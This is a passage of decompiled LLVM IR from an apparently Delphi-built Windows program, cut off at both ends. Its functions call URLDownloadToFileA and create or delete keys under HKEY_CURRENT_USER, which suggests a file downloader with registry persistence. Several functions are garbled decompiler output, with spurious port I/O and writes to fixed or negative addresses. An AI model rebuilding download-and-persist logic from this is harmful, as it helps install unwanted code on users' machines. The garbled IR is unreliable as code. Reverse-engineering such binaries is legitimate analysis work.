  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !557
  %2 = add i32 %1, -1, !insn.addr !557
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !557
  ret i32 %0, !insn.addr !558
}

define i32 @function_404fe8() local_unnamed_addr {
dec_label_pc_404fe8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !559
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !559
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !559
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !560
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !561
  %3 = add i32 %2, 1, !insn.addr !561
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !561
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !562
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !563
  ret i32 0, !insn.addr !564
}

define i32 @function_40500d() local_unnamed_addr {
dec_label_pc_40500d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !565
  ret i32 %0, !insn.addr !565
}

define i32 @function_405012() local_unnamed_addr {
dec_label_pc_405012:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !566
}

define i32 @function_405014(i32 %arg1) local_unnamed_addr {
dec_label_pc_405014:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !567
}

define i32 @function_405018() local_unnamed_addr {
dec_label_pc_405018:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !568
  %2 = add i32 %1, -1, !insn.addr !568
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !568
  ret i32 %0, !insn.addr !569
}

define i32 @function_405020(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_405020:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !570
  ret i32 %0, !insn.addr !570
}

define i32 @function_405028() local_unnamed_addr {
dec_label_pc_405028:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !571
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !571
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !571
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !572
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !573
  %3 = add i32 %2, 1, !insn.addr !573
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !573
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !574
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !575
  ret i32 0, !insn.addr !576
}

define i32 @function_40504d() local_unnamed_addr {
dec_label_pc_40504d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !577
  ret i32 %0, !insn.addr !577
}

define i32 @function_405052() local_unnamed_addr {
dec_label_pc_405052:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !578
}

define i32 @function_405054(i32 %arg1) local_unnamed_addr {
dec_label_pc_405054:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !579
}

define i32 @function_405058() local_unnamed_addr {
dec_label_pc_405058:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !580
  %2 = add i32 %1, -1, !insn.addr !580
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !580
  ret i32 %0, !insn.addr !581
}

define i32 @function_405060() local_unnamed_addr {
dec_label_pc_405060:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !582
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_405064, label %dec_label_pc_40506d, !insn.addr !583

dec_label_pc_405064:                              ; preds = %dec_label_pc_405060
  %4 = add nuw nsw i32 %3, 48, !insn.addr !584
  ret i32 %4, !insn.addr !585

dec_label_pc_40506d:                              ; preds = %dec_label_pc_405060
  %5 = add nuw nsw i32 %3, 55, !insn.addr !586
  ret i32 %5, !insn.addr !587
}

define i32 @function_405078() local_unnamed_addr {
dec_label_pc_405078:
  %esp.2.reg2mem = alloca i32, !insn.addr !588
  %esp.1.reg2mem = alloca i32, !insn.addr !588
  %cf.0.reg2mem = alloca i1, !insn.addr !588
  %esi.0.reg2mem = alloca i32, !insn.addr !588
  %esp.0.reg2mem = alloca i32, !insn.addr !588
  %ebx.0.reg2mem = alloca i32, !insn.addr !588
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !589
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !590
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !590
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !590
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !591
  %4 = call i32 @"@LStrClr"(), !insn.addr !592
  %5 = call i32 @function_4034f4(), !insn.addr !593
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !594
  br i1 %6, label %dec_label_pc_405179, label %dec_label_pc_4050c5.preheader, !insn.addr !594

dec_label_pc_4050c5.preheader:                    ; preds = %dec_label_pc_405078
  %7 = add i32 %0, -1, !insn.addr !595
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_4050c5

dec_label_pc_4050c5:                              ; preds = %dec_label_pc_4050c5.preheader, %dec_label_pc_405171
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !595
  %9 = inttoptr i32 %8 to i8*, !insn.addr !595
  %10 = load i8, i8* %9, align 1, !insn.addr !595
  %11 = icmp eq i8 %10, 32, !insn.addr !595
  %12 = icmp eq i1 %11, false, !insn.addr !596
  br i1 %12, label %dec_label_pc_4050e0, label %dec_label_pc_4050cf, !insn.addr !596

dec_label_pc_4050cf:                              ; preds = %dec_label_pc_4050c5
  %13 = call i32 @"@LStrCat"(), !insn.addr !597
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !598
  br label %dec_label_pc_405171, !insn.addr !598

dec_label_pc_4050e0:                              ; preds = %dec_label_pc_4050c5
  %14 = icmp ult i8 %10, 32, !insn.addr !599
  br i1 %14, label %dec_label_pc_405103, label %dec_label_pc_4050ea, !insn.addr !600

dec_label_pc_4050ea:                              ; preds = %dec_label_pc_4050e0
  %15 = add i8 %10, -32, !insn.addr !601
  %16 = icmp ult i8 %15, 95, !insn.addr !602
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !603
  br i1 %17, label %dec_label_pc_4050f7, label %dec_label_pc_405101, !insn.addr !603

dec_label_pc_4050f7:                              ; preds = %dec_label_pc_4050ea
  %18 = load i32, i32* inttoptr (i32 4215224 to i32*), align 8, !insn.addr !604
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !604
  %21 = shl i32 1, %20, !insn.addr !604
  %22 = and i32 %18, %21, !insn.addr !604
  %23 = icmp ne i32 %22, 0, !insn.addr !604
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !604
  br label %dec_label_pc_405101, !insn.addr !604

dec_label_pc_405101:                              ; preds = %dec_label_pc_4050ea, %dec_label_pc_4050f7
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !605
  br i1 %24, label %dec_label_pc_405158, label %dec_label_pc_405103, !insn.addr !605

dec_label_pc_405103:                              ; preds = %dec_label_pc_405101, %dec_label_pc_4050e0
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !606
  %27 = add i32 %esp.0.reload, -4, !insn.addr !607
  %28 = inttoptr i32 %27 to i32*, !insn.addr !607
  store i32 %26, i32* %28, align 4, !insn.addr !607
  %29 = add i32 %esp.0.reload, -8, !insn.addr !608
  %30 = inttoptr i32 %29 to i32*, !insn.addr !608
  store i32 ptrtoint (i32* @global_var_4051cc to i32), i32* %30, align 4, !insn.addr !608
  %31 = call i32 @function_405060(), !insn.addr !609
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !610
  %33 = add i32 %esp.0.reload, -12, !insn.addr !611
  %34 = inttoptr i32 %33 to i32*, !insn.addr !611
  store i32 0, i32* %34, align 4, !insn.addr !611
  %35 = call i32 @function_405060(), !insn.addr !612
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !613
  %37 = add i32 %esp.0.reload, -16, !insn.addr !614
  %38 = inttoptr i32 %37 to i32*, !insn.addr !614
  store i32 0, i32* %38, align 4, !insn.addr !614
  %39 = call i32 @"@LStrCatN"(), !insn.addr !615
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !616
  br label %dec_label_pc_405171, !insn.addr !616

dec_label_pc_405158:                              ; preds = %dec_label_pc_405101
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !617
  %41 = call i32 @"@LStrCat"(), !insn.addr !618
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !618
  br label %dec_label_pc_405171, !insn.addr !618

dec_label_pc_405171:                              ; preds = %dec_label_pc_405158, %dec_label_pc_405103, %dec_label_pc_4050cf
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !619
  %43 = add i32 %esi.0.reload, -1, !insn.addr !620
  %44 = icmp eq i32 %43, 0, !insn.addr !620
  %45 = icmp eq i1 %44, false, !insn.addr !621
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !621
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !621
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !621
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !621
  br i1 %45, label %dec_label_pc_4050c5, label %dec_label_pc_405179, !insn.addr !621

dec_label_pc_405179:                              ; preds = %dec_label_pc_405171, %dec_label_pc_405078
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !622
  %47 = load i32, i32* %46, align 4, !insn.addr !622
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !623
  %48 = add i32 %esp.2.reload, 8, !insn.addr !624
  %49 = inttoptr i32 %48 to i32*, !insn.addr !624
  store i32 4215203, i32* %49, align 4, !insn.addr !624
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !625
  %51 = call i32 @"@LStrClr"(), !insn.addr !626
  ret i32 %51, !insn.addr !627
}

define i32 @function_40519c() local_unnamed_addr {
dec_label_pc_40519c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !628
  ret i32 %0, !insn.addr !628
}

define i32 @function_4051a1() local_unnamed_addr {
dec_label_pc_4051a1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !629
}

define i32 @function_4051a3(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !630
}

define i32 @function_4051c7() local_unnamed_addr {
dec_label_pc_4051c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !631
  %2 = inttoptr i32 %0 to i32*, !insn.addr !631
  store i32 %1, i32* %2, align 4, !insn.addr !631
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !632
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !632
  %7 = add i8 %4, %6, !insn.addr !632
  %8 = inttoptr i32 %5 to i8*, !insn.addr !632
  store i8 %7, i8* %8, align 1, !insn.addr !632
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !633
  %10 = load i32, i32* %eax, align 4, !insn.addr !633
  %11 = udiv i32 %10, 256, !insn.addr !633
  %12 = trunc i32 %11 to i8, !insn.addr !633
  %13 = add i8 %9, %12, !insn.addr !633
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !633
  %14 = call i32 @function_4036e4(), !insn.addr !634
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !635
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !635
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !635
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !636
  %17 = call i32 @"@LStrCatN"(), !insn.addr !637
  %18 = call i32 @function_4036f4(), !insn.addr !638
  %19 = inttoptr i32 %18 to i32*, !insn.addr !639
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !639
  call void @__writefsdword(i32 0, i32 0), !insn.addr !640
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !641
  ret i32 %21, !insn.addr !642
}

define i32 @function_4051d0() local_unnamed_addr {
dec_label_pc_4051d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_40523e() local_unnamed_addr {
dec_label_pc_40523e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !643
  ret i32 %0, !insn.addr !643
}

define i32 @function_405243() local_unnamed_addr {
dec_label_pc_405243:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !644
}

define i32 @function_405245(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405245:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !645
}

define i32 @function_40524f() local_unnamed_addr {
dec_label_pc_40524f:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !646
  %5 = inttoptr i32 %3 to i32*, !insn.addr !646
  store i32 %4, i32* %5, align 4, !insn.addr !646
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !647
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !647
  %10 = add i8 %7, %9, !insn.addr !647
  %11 = inttoptr i32 %8 to i8*, !insn.addr !647
  store i8 %10, i8* %11, align 1, !insn.addr !647
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !648
  %14 = udiv i32 %1, 256, !insn.addr !648
  %15 = trunc i32 %14 to i8, !insn.addr !648
  %16 = add i8 %13, %15, !insn.addr !648
  %17 = load i32, i32* %edi, align 4, !insn.addr !648
  %18 = inttoptr i32 %17 to i8*, !insn.addr !648
  store i8 %16, i8* %18, align 1, !insn.addr !648
  %19 = load i8, i8* %6, align 4, !insn.addr !649
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !649
  %22 = add i8 %19, %21, !insn.addr !649
  %23 = inttoptr i32 %20 to i8*, !insn.addr !649
  store i8 %22, i8* %23, align 1, !insn.addr !649
  %24 = add i32 %0, -117, !insn.addr !650
  %25 = inttoptr i32 %24 to i8*, !insn.addr !650
  %26 = load i8, i8* %25, align 1, !insn.addr !650
  %27 = trunc i32 %2 to i8, !insn.addr !650
  %28 = add i8 %26, %27, !insn.addr !650
  store i8 %28, i8* %25, align 1, !insn.addr !650
  %29 = trunc i32 %2 to i16, !insn.addr !651
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !651
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !652
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !652
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !652
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !653
  %33 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !654
  %34 = add i32 %33, 1, !insn.addr !654
  store i32 %34, i32* @global_var_4096ac, align 4, !insn.addr !654
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !655
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !656
  ret i32 0, !insn.addr !657
}

define i32 @function_40527d() local_unnamed_addr {
dec_label_pc_40527d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !658
  ret i32 %0, !insn.addr !658
}

define i32 @function_405282() local_unnamed_addr {
dec_label_pc_405282:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !659
}

define i32 @function_405284(i32 %arg1) local_unnamed_addr {
dec_label_pc_405284:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !660
}

define i32 @function_405288() local_unnamed_addr {
dec_label_pc_405288:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !661
  %2 = add i32 %1, -1, !insn.addr !661
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !661
  ret i32 %0, !insn.addr !662
}

define i32 @function_405290() local_unnamed_addr {
dec_label_pc_405290:
  %eax.0.reg2mem = alloca i32, !insn.addr !663
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !664
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !665
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !666
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_40531c, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !667
  %1 = call i32 @function_4043b8(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_40531c, i32 0, i32 0), i32 -2147483647), !insn.addr !668
  %2 = icmp eq i32 %1, 0, !insn.addr !669
  %3 = icmp eq i1 %2, false, !insn.addr !670
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !670
  br i1 %3, label %dec_label_pc_40530a, label %dec_label_pc_4052c5, !insn.addr !670

dec_label_pc_4052c5:                              ; preds = %dec_label_pc_405290
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !671
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !672
  %5 = call i32 @function_4043c0(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_408104, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_405338, i32 0, i32 0), i32 -2147483647), !insn.addr !672
  %6 = icmp eq i32 %5, 0, !insn.addr !673
  %7 = icmp eq i1 %6, false, !insn.addr !674
  br i1 %7, label %dec_label_pc_405301, label %dec_label_pc_4052f1, !insn.addr !674

dec_label_pc_4052f1:                              ; preds = %dec_label_pc_4052c5
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !675
  br label %dec_label_pc_405301, !insn.addr !675

dec_label_pc_405301:                              ; preds = %dec_label_pc_4052f1, %dec_label_pc_4052c5
  %9 = call i32 @function_4043a0(), !insn.addr !676
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !676
  br label %dec_label_pc_40530a, !insn.addr !676

dec_label_pc_40530a:                              ; preds = %dec_label_pc_405301, %dec_label_pc_405290
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !677
}

define i32 @function_405313(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_405313:
  %esp.1.reg2mem = alloca i32, !insn.addr !678
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !678
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !678
  %6 = inttoptr i32 %3 to i32*, !insn.addr !678
  store i32 %5, i32* %6, align 4, !insn.addr !678
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !679
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !679
  %11 = add i8 %8, %10, !insn.addr !679
  %12 = inttoptr i32 %9 to i8*, !insn.addr !679
  store i8 %11, i8* %12, align 1, !insn.addr !679
  %13 = add i32 %1, 122, !insn.addr !680
  %14 = inttoptr i32 %13 to i8*, !insn.addr !680
  %15 = load i8, i8* %14, align 1, !insn.addr !680
  %16 = udiv i32 %4, 256, !insn.addr !680
  %17 = trunc i32 %16 to i8, !insn.addr !680
  %18 = add i8 %15, %17, !insn.addr !680
  store i8 %18, i8* %14, align 1, !insn.addr !680
  %19 = load i8, i8* %7, align 4, !insn.addr !681
  %20 = load i32, i32* %eax, align 4, !insn.addr !681
  %21 = trunc i32 %20 to i8, !insn.addr !681
  %22 = add i8 %19, %21, !insn.addr !681
  %23 = icmp eq i8 %22, 0, !insn.addr !681
  %24 = inttoptr i32 %20 to i8*, !insn.addr !681
  store i8 %22, i8* %24, align 1, !insn.addr !681
  %25 = trunc i32 %3 to i16, !insn.addr !682
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !682
  br i1 %23, label %26, label %dec_label_pc_405321, !insn.addr !683

; <label>:26:                                     ; preds = %dec_label_pc_405313
  %27 = call i32 @unknown_5398(), !insn.addr !683
  br label %dec_label_pc_405321, !insn.addr !683

dec_label_pc_405321:                              ; preds = %26, %dec_label_pc_405313
  %28 = icmp ult i8 %22, %19, !insn.addr !681
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !684
  store i32 %29, i32* %eax, align 4, !insn.addr !684
  br i1 %28, label %dec_label_pc_405389, label %dec_label_pc_405324, !insn.addr !685

dec_label_pc_405324:                              ; preds = %dec_label_pc_405321
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !686, !insn.addr !681
  %31 = and i8 %30, 1, !insn.addr !681
  %32 = icmp eq i8 %31, 0, !insn.addr !681
  %33 = trunc i32 %arg4 to i16, !insn.addr !687
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !687
  %35 = inttoptr i32 %2 to i32*, !insn.addr !687
  store i32 %34, i32* %35, align 4, !insn.addr !687
  br i1 %32, label %dec_label_pc_405384, label %dec_label_pc_405328, !insn.addr !688

dec_label_pc_405328:                              ; preds = %dec_label_pc_405324
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !689
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !690
  %36 = add i32 %arg4, 1, !insn.addr !691
  %37 = icmp eq i32 %36, 0, !insn.addr !691
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !692
  br i1 %37, label %dec_label_pc_40538f, label %dec_label_pc_40532e, !insn.addr !692

dec_label_pc_40532e:                              ; preds = %dec_label_pc_405328
  %38 = load i32, i32* %eax, align 4, !insn.addr !693
  %39 = add i32 %38, -1, !insn.addr !693
  store i32 %39, i32* %eax, align 4, !insn.addr !693
  %40 = trunc i32 %36 to i16, !insn.addr !694
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !694
  %42 = load i32, i32* %41, align 4, !insn.addr !694
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !694
  %43 = load i32, i32* %41, align 4, !insn.addr !695
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !695
  %44 = add i32 %arg7, 105, !insn.addr !696
  %45 = inttoptr i32 %44 to i8*, !insn.addr !696
  %46 = load i8, i8* %45, align 1, !insn.addr !696
  %47 = trunc i32 %39 to i8, !insn.addr !696
  %48 = add i8 %46, %47, !insn.addr !696
  %49 = icmp ult i8 %48, %46, !insn.addr !696
  store i8 %48, i8* %45, align 1, !insn.addr !696
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !697
  br i1 %49, label %dec_label_pc_4053af, label %dec_label_pc_40533c, !insn.addr !697

dec_label_pc_40533c:                              ; preds = %dec_label_pc_40532e
  %50 = icmp eq i8 %48, 0, !insn.addr !696
  br i1 %50, label %dec_label_pc_40535e, label %dec_label_pc_40533e, !insn.addr !698

dec_label_pc_40533e:                              ; preds = %dec_label_pc_40533c
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !699
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_4053af

dec_label_pc_40535e:                              ; preds = %dec_label_pc_40533c
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !700
  %53 = load i32, i32* %52, align 4, !insn.addr !700
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !700
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !701
  store i32 ptrtoint ([27 x i8]* @global_var_4053f4 to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !702
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !703
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !704
  %55 = add i32 %arg6, -8, !insn.addr !705
  %56 = inttoptr i32 %55 to i32*, !insn.addr !705
  store i32 0, i32* %56, align 4, !insn.addr !705
  %57 = add i32 %arg6, -12, !insn.addr !706
  %58 = inttoptr i32 %57 to i32*, !insn.addr !706
  store i32 1, i32* %58, align 4, !insn.addr !706
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !707
  ret i32 %57, !insn.addr !707

dec_label_pc_405384:                              ; preds = %dec_label_pc_405324
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !708

dec_label_pc_405389:                              ; preds = %dec_label_pc_405321
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !709
  %62 = add i8 %60, %61, !insn.addr !709
  %63 = inttoptr i32 %2 to i8*, !insn.addr !709
  store i8 %62, i8* %63, align 1, !insn.addr !709
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !710
  %65 = load i8, i8* %64, align 1, !insn.addr !710
  %66 = udiv i32 %arg3, 256, !insn.addr !710
  %67 = trunc i32 %66 to i8, !insn.addr !710
  %68 = add i8 %65, %67, !insn.addr !710
  store i8 %68, i8* %64, align 1, !insn.addr !710
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !710
  br label %dec_label_pc_40538f, !insn.addr !710

dec_label_pc_40538f:                              ; preds = %dec_label_pc_405389, %dec_label_pc_405328
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !711
  %70 = inttoptr i32 %69 to i32*, !insn.addr !711
  store i32 0, i32* %70, align 4, !insn.addr !711
  %71 = add i32 %esp.0, -8, !insn.addr !712
  %72 = inttoptr i32 %71 to i32*, !insn.addr !712
  store i32 0, i32* %72, align 4, !insn.addr !712
  %73 = add i32 %esp.0, -12, !insn.addr !713
  %74 = inttoptr i32 %73 to i32*, !insn.addr !713
  store i32 ptrtoint ([27 x i8]* @global_var_4053f4 to i32), i32* %74, align 4, !insn.addr !713
  %75 = add i32 %esp.0, -16, !insn.addr !714
  %76 = inttoptr i32 %75 to i32*, !insn.addr !714
  store i32 -2147483647, i32* %76, align 4, !insn.addr !714
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !715
  %78 = call i32 @function_4034f4(), !insn.addr !716
  %79 = add i32 %78, 1, !insn.addr !717
  %80 = add i32 %esp.0, -20, !insn.addr !718
  %81 = inttoptr i32 %80 to i32*, !insn.addr !718
  store i32 %79, i32* %81, align 4, !insn.addr !718
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !719
  br label %dec_label_pc_4053af, !insn.addr !719

dec_label_pc_4053af:                              ; preds = %dec_label_pc_40533e, %dec_label_pc_40538f, %dec_label_pc_40532e
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036f4(), !insn.addr !720
  %83 = add i32 %esp.1.reload, -4, !insn.addr !721
  %84 = inttoptr i32 %83 to i32*, !insn.addr !721
  store i32 %82, i32* %84, align 4, !insn.addr !721
  %85 = add i32 %esp.1.reload, -8, !insn.addr !722
  %86 = inttoptr i32 %85 to i32*, !insn.addr !722
  store i32 1, i32* %86, align 4, !insn.addr !722
  %87 = add i32 %esp.1.reload, -12, !insn.addr !723
